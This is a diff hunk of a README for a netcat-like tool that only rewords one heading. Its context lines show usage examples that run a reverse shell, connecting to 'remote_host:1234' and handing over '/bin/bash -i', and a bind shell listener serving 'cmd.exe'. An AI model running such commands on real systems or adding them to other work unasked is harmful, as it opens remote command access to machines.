@@ -50,7 +50,7 @@ Some really common use cases I have are:
 # Start the shell
 ❯ ng -c remote_host:1234 -e '/bin/bash -i'
 ```
-### Start the same shell on a bind listener.
+### Start a shell on a bind listener.
 This is useful in certail cases because you can create as many conenctions as you like - if your shell drops, just re-connect.
 ```
 ❯ ng -l 1234 -e 'cmd.exe'
